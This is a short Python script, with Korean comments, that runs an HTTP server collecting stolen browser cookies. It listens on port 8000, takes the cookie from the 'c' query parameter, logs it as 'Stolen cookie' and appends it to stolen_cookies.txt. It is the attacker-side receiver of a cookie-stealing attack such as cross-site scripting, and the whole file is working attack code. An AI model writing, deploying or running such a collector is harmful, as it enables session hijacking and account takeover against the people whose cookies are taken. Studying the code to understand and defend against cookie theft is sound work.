from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

class StealHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        query = parse_qs(parsed.query)
        cookie = query.get('c', [''])[0]  # 안전하게 get

        print("[+] Stolen cookie:", cookie)  # 확인 로그
        with open("stolen_cookies.txt", "a") as f:
            f.write(cookie + "\n")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Got it!')

httpd = HTTPServer(('0.0.0.0', 8000), StealHandler)
print("[*] Listening on port 8000...")
httpd.serve_forever()
